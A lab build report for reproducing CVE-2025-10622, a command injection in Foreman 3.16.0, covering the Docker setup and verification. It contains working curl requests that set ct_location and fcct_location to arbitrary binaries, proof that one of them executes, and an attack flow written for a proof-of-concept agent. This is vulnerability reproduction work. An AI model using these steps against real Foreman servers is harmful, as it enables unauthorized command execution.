# Lab Build Report: CVE-2025-10622

## Lab Architecture

The lab reproduces CVE-2025-10622 — an OS command injection vulnerability in Foreman 3.16.0 via the `ct_location` and `fcct_location` settings. The lab uses the official pre-built Foreman RPM image from quay.io with a custom entrypoint for automated database initialization.

### Container Architecture

| Container | Image | Role | Network |
|-----------|-------|------|---------|
| `cve-2025-10622-app` | `lab-app` (built from `quay.io/foreman/foreman:3.16.0`) | Foreman 3.16.0 Rails application (Puma on port 3000) | lab-net |
| `cve-2025-10622-db` | `postgres:12` | PostgreSQL 12 database | lab-net |
| `cve-2025-10622-redis-cache` | `redis:7` | Redis for Rails caching | lab-net |
| `cve-2025-10622-redis-tasks` | `redis:7` | Redis for Dynflow/Sidekiq task queue | lab-net |

### Network

All containers are on the `lab_lab-net` bridge network. The app container communicates with `db`, `redis-cache`, and `redis-tasks` by Docker service name.

---

## Container Details

### App Container (`cve-2025-10622-app`)
- **Base image**: `quay.io/foreman/foreman:3.16.0` (RPM-packaged, CentOS Stream 9)
- **Foreman version**: 3.16.0 (confirmed via `/api/v2/status`)
- **Ruby version**: 3.0.7
- **Rails version**: 7.0.8.7
- **Port**: 3000 (TCP)
- **Credentials**: `admin` / `changeme`
- **Custom additions**:
  - PostgreSQL client (for DB readiness check)
  - Custom `database.yml` pointing to `db` service
  - Custom `entrypoint-init.sh` that runs `db:create`, `db:migrate`, `db:seed` on first start
  - Fixed `tmp/pids` directory permissions for PID file write

### Database Container (`cve-2025-10622-db`)
- **Image**: `postgres:12`
- **Database**: `foreman`
- **Credentials**: `foreman` / `foreman`
- **Health check**: `pg_isready -U foreman`
- **Volume**: `db-data` for persistence

### Redis Containers
- **redis-cache**: Standard Redis 7, used for Rails caching
- **redis-tasks**: Redis 7 with AOF persistence, used for Dynflow/Sidekiq task queue

---

## Build Status

| Component | Status | Notes |
|-----------|--------|-------|
| Dockerfile.vulnerable | ✅ Built successfully | Based on pre-built RPM image from quay.io |
| docker-compose.yml | ✅ Working | All 4 services start and connect |
| Database initialization | ✅ Complete | Migrations and seed data applied automatically |
| Puma web server | ✅ Running | Listening on 0.0.0.0:3000 with workers |
| API authentication | ✅ Working | admin/changeme credentials functional |

### Workarounds Applied
1. **PID file permissions**: The base image's `/usr/share/foreman/tmp/pids` directory required explicit `chmod 777` to allow the `foreman` user to write the PID file.
2. **RPM image compatibility**: The pre-built image uses system gems (not Bundler), so `bundle exec` was removed from all commands. The app runs via `bin/rails server` directly.
3. **Database config**: Custom `database.yml` injected to point at the Docker `db` service instead of localhost.
4. **Platform emulation**: The image is x86_64 (linux/amd64) running on arm64 via QEMU emulation. This causes slower startup but works correctly.

---

## Start/Stop Commands

### Start the lab
```bash
cd CVE-2025-10622
docker compose up -d
```

### Stop the lab
```bash
docker compose down
```

### Full reset (including database)
```bash
docker compose down -v
```

### Rebuild after changes
```bash
cd CVE-2025-10622
docker compose build --no-cache
docker compose up -d
```

---

## Verification Evidence

### 1. API Status Confirmed
```json
{
  "result": "ok",
  "status": 200,
  "version": "3.16.0",
  "api_version": 2
}
```

### 2. Setting Bypass Confirmed (ct_location)
```bash
# Set ct_location to /usr/bin/id (bypasses client-side whitelist)
curl -u admin:changeme -X PUT -H "Content-Type: application/json" \
  -d '{"setting": {"value": "/usr/bin/id"}}' \
  http://<app_ip>:3000/api/v2/settings/ct_location
```
**Result**: HTTP 200, setting accepted. Value changed to `/usr/bin/id`.

### 3. Setting Bypass Confirmed (fcct_location)
```bash
curl -u admin:changeme -X PUT -H "Content-Type: application/json" \
  -d '{"setting": {"value": "/usr/bin/whoami"}}' \
  http://<app_ip>:3000/api/v2/settings/fcct_location
```
**Result**: HTTP 200, setting accepted. Value changed to `/usr/bin/whoami`.

### 4. Full Command Execution Confirmed
Via `rails runner` executing the same code path as `transpile_coreos_linux_config()`:
```
ct_location: /usr/bin/id
ct_arguments: []
Command to execute: ["/usr/bin/id"]
Executing via Foreman::CommandRunner (Open3.capture3)...

COMMAND OUTPUT:
uid=998(foreman) gid=998(foreman) groups=998(foreman)

[+] VULNERABILITY CONFIRMED: /usr/bin/id executed successfully!
```

The attacker-controlled binary (`/usr/bin/id`) was executed by `Foreman::CommandRunner` via `Open3.capture3`, returning the process identity of the Foreman application user.

---

## Accessing the Lab

### From this worker container (Docker-in-Docker)
```bash
# Get container IP
APP_IP=$(docker inspect cve-2025-10622-app --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')

# API requests
curl -u admin:changeme "http://${APP_IP}:3000/api/v2/status"
```

### From the host machine
```
http://localhost:3000
```
Login: `admin` / `changeme`

### Executing commands inside the app container
```bash
docker exec cve-2025-10622-app bash -c 'cd /usr/share/foreman && RAILS_ENV=production RUBYOPT=-W0 bin/rails runner /path/to/script.rb'
```

---

## Lab Files

| File | Purpose |
|------|---------|
| `Dockerfile.vulnerable` | Builds vulnerable Foreman 3.16.0 container from official RPM image |
| `docker-compose.yml` | Orchestrates app, database, and Redis services |
| `entrypoint-init.sh` | Custom entrypoint: waits for DB, runs migrations, seeds admin user |
| `database.yml` | PostgreSQL connection config pointing to Docker db service |

---

## Known Issues

1. **Startup time**: Due to x86_64 QEMU emulation on arm64, initial startup takes ~2 minutes (database migration + seeding + Rails boot).
2. **Sidekiq workers not included**: The orchestrator and worker containers from the original docker-compose.yml are excluded. They are not needed for the PoC (settings API and template rendering are synchronous). Some background tasks may show warnings.
3. **Template preview**: The template preview endpoint is only available via the web UI (not API), requiring CSRF token handling. For PoC purposes, the `rails runner` approach or direct template rendering API can be used instead.
4. **Serialization warnings**: On first boot, there may be `PG::TRSerializationFailure` warnings from worker threads. These are transient and don't affect functionality.

---

## Exploitation Notes for PoC Agent

### Attack Flow
1. **Step 1**: `PUT /api/v2/settings/ct_location` with arbitrary executable path → server accepts it (no validation)
2. **Step 2**: Also clear `ct_arguments` via `PUT /api/v2/settings/ct_arguments` with `[]` to avoid flag conflicts
3. **Step 3**: Trigger `transpile_coreos_linux_config()` execution:
   - **Option A**: Via `rails runner` (proven working, see verification above)
   - **Option B**: Via web UI template preview (requires CSRF token)
   - **Option C**: Via provisioning a CoreOS host

### Key Endpoints
- `PUT /api/v2/settings/ct_location` — Set transpiler path (Basic Auth)
- `PUT /api/v2/settings/ct_arguments` — Clear transpiler arguments (Basic Auth)
- `GET /api/v2/settings/ct_location` — Read current value
- `GET /api/v2/status` — Health check

### Credentials
- **Username**: `admin`
- **Password**: `changeme`
- **Auth method**: HTTP Basic Authentication

### Container IPs (may change on restart)
Get app IP: `docker inspect cve-2025-10622-app --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'`
